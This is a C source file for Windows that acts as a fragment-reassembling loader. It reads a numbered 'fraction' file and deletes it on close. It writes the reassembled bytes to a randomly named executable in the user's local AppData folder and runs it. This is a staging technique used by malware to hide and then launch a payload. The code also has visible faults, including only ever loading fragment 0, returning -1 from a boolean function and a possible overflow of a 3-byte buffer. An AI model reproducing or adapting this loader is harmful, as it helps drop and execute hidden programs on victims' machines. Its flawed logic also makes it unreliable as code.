#include <Windows.h>

#define IsCharacterAnInteger isdigit
#define ConvertStringToInteger atoi

PBYTE g_BinaryBuffer = NULL;
DWORD g_FractionTotal = 0;

SIZE_T StringLengthW(LPCWSTR String) {
    LPCWSTR String2;
    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2) {
    PWCHAR p = String1;
    while ((*p++ = *String2++) != 0);
    return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2) {
    StringCopyW(&String[StringLengthW(String)], String2);
    return String;
}

ULONG Next = 2; // seed

INT PseudoRandomIntegerSubroutine(PULONG Context) {
    return ((*Context = *Context * 1103515245 + 12345) % ((ULONG)RAND_MAX + 1));
}

INT CreatePseudoRandomInteger(VOID) {
    return (PseudoRandomIntegerSubroutine(&Next));
}

PWCHAR CreatePseudoRandomStringW(SIZE_T dwLength) {
    WCHAR DataSet[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    PWCHAR String = NULL;
    String = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(WCHAR) * (dwLength + 1)));
    if (String == NULL) return NULL;
#pragma warning(push)
#pragma warning(disable: 4018)
    for (INT dwN = 0; dwN < dwLength; dwN++) {
        INT Key = CreatePseudoRandomInteger() % (INT)(StringLengthW(DataSet) - 1);
        String[dwN] = DataSet[Key];
    }
#pragma warning(pop)
#pragma warning(push)
#pragma warning(disable: 6386)
    String[dwLength] = '\0';
#pragma warning(pop)
    return String;
}

DWORD Win32FromHResult(HRESULT Result) {
    if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
        return HRESULT_CODE(Result);
    if (Result == S_OK)
        return ERROR_SUCCESS;
    return ERROR_CAN_NOT_COMPLETE;
}

LONGLONG GetFileSizeFromPathDisposeHandleW(PWCHAR Path, DWORD dwFlagsAndAttributes) {
    LARGE_INTEGER LargeInteger;
    HANDLE hHandle = INVALID_HANDLE_VALUE;
    hHandle = CreateFileW(Path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, dwFlagsAndAttributes, NULL);
    if (hHandle == INVALID_HANDLE_VALUE) return INVALID_FILE_SIZE;
    if (GetFileSizeEx(hHandle, &LargeInteger)) {
        if (hHandle) CloseHandle(hHandle);
        return LargeInteger.QuadPart;
    }
    return INVALID_FILE_SIZE;
}

VOID ByteArrayToCharArrayA(PCHAR Char, PBYTE Byte, DWORD Length) {
    for (DWORD dwX = 0; dwX < Length; dwX++) {
        Char[dwX] = (BYTE)Byte[dwX];
    }
}

BOOL IsPathValidW(PWCHAR FilePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    hFile = CreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    if (hFile) CloseHandle(hFile);
    return TRUE;
}

BOOL GetFractionedOrdinal(PWCHAR Path, DWORD Ordinal) {
    HANDLE hHandle = INVALID_HANDLE_VALUE;
    CHAR CharString[32] = { 0 };
    CHAR OffsetInteger[3] = { 0 };
    DWORD dwOffset = 0;
    INT Offset;
    BYTE Buffer[32] = { 0 };

    if (!IsPathValidW(Path)) return -1;

    hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hHandle == INVALID_HANDLE_VALUE) return -1;

    if (!ReadFile(hHandle, Buffer, 32, NULL, NULL)) {
        CloseHandle(hHandle);
        return -1;
    }

    ByteArrayToCharArrayA(CharString, Buffer, 32);

    for (DWORD dwX = 0; dwX < 32; dwX++) {
        if (CharString[dwX] == ' ' || CharString[dwX] == '<' || CharString[dwX] == '>')
            continue;
        if (CharString[dwX] >= '0' && CharString[dwX] <= '9') {
            if (IsCharacterAnInteger((UCHAR)CharString[dwX])) {
                OffsetInteger[dwOffset] = CharString[dwX];
                dwOffset++;
            }
        }
    }

    Offset = ConvertStringToInteger(OffsetInteger);

    if (hHandle) CloseHandle(hHandle);

    return (Offset == Ordinal ? TRUE : FALSE);
}

BOOL LoadFractionIntoBuffer(PWCHAR Path, DWORD Ordinal) {
    HANDLE hHandle = INVALID_HANDLE_VALUE;
    BOOL bFlag = FALSE;
    BYTE FractionBuffer[1024] = { 0 };
    DWORD dwError = ERROR_SUCCESS;

    hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hHandle == INVALID_HANDLE_VALUE) goto EXIT_ROUTINE;

    if (SetFilePointer(hHandle, 32, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) goto EXIT_ROUTINE;

    if (!ReadFile(hHandle, FractionBuffer, 1024, &dwError, NULL)) goto EXIT_ROUTINE;

    dwError = Ordinal * 1024;
    CopyMemory(g_BinaryBuffer + dwError, FractionBuffer, 1024);
    dwError = ERROR_SUCCESS;
    bFlag = TRUE;

EXIT_ROUTINE:
    if (hHandle) CloseHandle(hHandle);
    return bFlag;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
    LPWSTR* szArgList;
    int nArgs;
    szArgList = CommandLineToArgvW(GetCommandLineW(), &nArgs);
    if (nArgs < 2) {
        MessageBox(NULL, L"Insufficient command line arguments. Please provide the file path.", L"Error", MB_OK);
        return 1;
    }

    WCHAR FractionPath[MAX_PATH * sizeof(WCHAR)] = { 0 };
    WCHAR BinaryExecutionPath[MAX_PATH * sizeof(WCHAR)] = { 0 };
    BOOL bFlag = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hHandle = INVALID_HANDLE_VALUE;
    PROCESS_INFORMATION Pi;
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    STARTUPINFOEXW Si;
    ZeroMemory(&Si, sizeof(STARTUPINFOEXW));

    StringCopyW(FractionPath, szArgList[1]);

    g_FractionTotal = GetFileSizeFromPathDisposeHandleW(FractionPath, FILE_ATTRIBUTE_NORMAL);
    if (g_FractionTotal == INVALID_FILE_SIZE) goto EXIT_ROUTINE;

    g_BinaryBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_FractionTotal + 1024); // offset
    if (g_BinaryBuffer == NULL) goto EXIT_ROUTINE;

    if (GetFractionedOrdinal(FractionPath, 0)) {
        if (!LoadFractionIntoBuffer(FractionPath, 0)) goto EXIT_ROUTINE;
    }

    if (GetEnvironmentVariableW(L"LOCALAPPDATA", BinaryExecutionPath, MAX_PATH * sizeof(WCHAR)) == 0) goto EXIT_ROUTINE;
    Next++;
    StringConcatW(BinaryExecutionPath, (PWCHAR)L"\\");
    StringConcatW(BinaryExecutionPath, CreatePseudoRandomStringW(5));
    StringConcatW(BinaryExecutionPath, (PWCHAR)L".exe");

    hHandle = CreateFileW(BinaryExecutionPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hHandle == INVALID_HANDLE_VALUE) goto EXIT_ROUTINE;

    dwError = ERROR_SUCCESS;
    if (WriteFile(hHandle, g_BinaryBuffer, g_FractionTotal, &dwError, NULL)) {
        if (hHandle) CloseHandle(hHandle);
        if (!CreateProcessW(BinaryExecutionPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &Si.StartupInfo, &Pi)) goto EXIT_ROUTINE;
        WaitForSingleObject(Pi.hProcess, INFINITE);
    }
    else {
        if (hHandle) CloseHandle(hHandle);
        goto EXIT_ROUTINE;
    }

    bFlag = TRUE;

EXIT_ROUTINE:
    if (!bFlag) dwError = GetLastError();
    if (g_BinaryBuffer) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, g_BinaryBuffer);
    if (Pi.hProcess) CloseHandle(Pi.hProcess);
    if (Pi.hThread) CloseHandle(Pi.hThread);
    return dwError;
}
